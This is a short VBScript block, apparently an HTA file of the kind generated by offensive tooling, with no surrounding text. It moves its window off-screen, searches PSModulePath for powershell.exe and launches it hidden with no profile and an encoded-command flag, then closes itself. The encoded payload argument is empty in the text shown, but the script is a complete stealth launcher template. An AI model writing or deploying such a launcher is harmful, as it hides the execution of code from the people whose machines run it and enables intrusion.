<script language="VBScript">
  window.moveTo -4000, -4000
  Set dtHaNCO = CreateObject("Wscript.Shell")
  Set jmQYUVi = CreateObject("Scripting.FileSystemObject")
  For each path in Split(dtHaNCO.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If jmQYUVi.FileExists(path + "\..\powershell.exe") Then
      dtHaNCO.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
